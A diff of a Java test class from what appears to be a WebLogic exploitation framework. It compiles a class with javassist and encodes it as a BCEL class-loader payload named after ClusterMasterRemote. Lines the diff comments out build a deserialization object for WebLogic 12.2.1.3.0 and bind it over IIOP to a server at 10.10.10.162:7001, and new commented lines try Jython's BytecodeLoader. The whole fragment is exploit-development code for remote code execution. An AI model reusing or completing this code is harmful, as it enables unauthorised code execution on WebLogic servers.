@@ -16,10 +16,10 @@
 package com.weblogic.framework;
 import com.sun.org.apache.bcel.internal.classfile.Utility;
 import com.sun.org.apache.bcel.internal.util.ClassLoader;
-import com.weblogic.framework.entity.ContextPojo;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.mozilla.classfile.DefiningClassLoader;
+import org.python.core.BytecodeLoader;
 import weblogic.cluster.singleton.ClusterMasterRemote;
 
 import javax.management.BadAttributeValueExpException;
@@ -29,6 +29,8 @@ import java.lang.reflect.Field;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.rmi.Remote;
+import java.security.SecureClassLoader;
+
 import static com.weblogic.framework.utils.CallUtils.CALL_MAP;
 import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
 import static com.weblogic.framework.utils.ContextUtils.rebind;
@@ -68,22 +70,24 @@ public class Test {
         ctClass.setName(callClazz.getSimpleName());
         byte[] bytes = ctClass.toBytecode();
         String result = Utility.encode(bytes, true);
-        result = "$$BCEL$$"+result;
+        result = "PocServerClusterMasterRemote$$BCEL$$"+result;
         System.out.println(result);
 
-        URLClassLoader urlClassLoader = loadJar("12.2.1.3.0",VUL_DEPENDENCIES);
-
-        String bindName = getRandomString(16);
-        Object sendObject = getObject(null, new String[]{bindName,""}, result,urlClassLoader);
-
-        ContextPojo contextPojo = rebind("iiop://10.10.10.162:7001", sendObject, urlClassLoader);
+//        URLClassLoader urlClassLoader = loadJar("12.2.1.3.0",VUL_DEPENDENCIES);
+//
+//        String bindName = getRandomString(16);
+//        Object sendObject = getObject(null, new String[]{bindName,""}, result,urlClassLoader);
+//
+//        ContextPojo contextPojo = rebind("iiop://10.10.10.162:7001", sendObject, urlClassLoader);
 
 //        com.sun.org.apache.bcel.internal.util.ClassLoader.class.newInstance().loadClass(result);
 //        Class clazz = Class.forName(result,true, new ClassLoader());
 //        ClassLoader classLoader = new ClassLoader();
+//        BytecodeLoader loader2 = new BytecodeLoader();
+//        BytecodeLoader.makeClass("PocServerClusterMasterRemote", null, bytes);
 //        Class clazz1 = classLoader.getParent().loadClass("weblogic.cluster.singleton.ClusterMasterRemote");
 //        Class clazz1 = classLoader.loadClass("weblogic.cluster.singleton.ClusterMasterRemote");
-//        Class clazz = classLoader.loadClass("weblogic.cluster.singleton.ClusterMasterRemote"+"$$BCEL$$"+result);
+//        Class clazz = classLoader.createClass(result);
 //         $$BCEL$$$
 //        System.out.println(clazz.getName());
     }
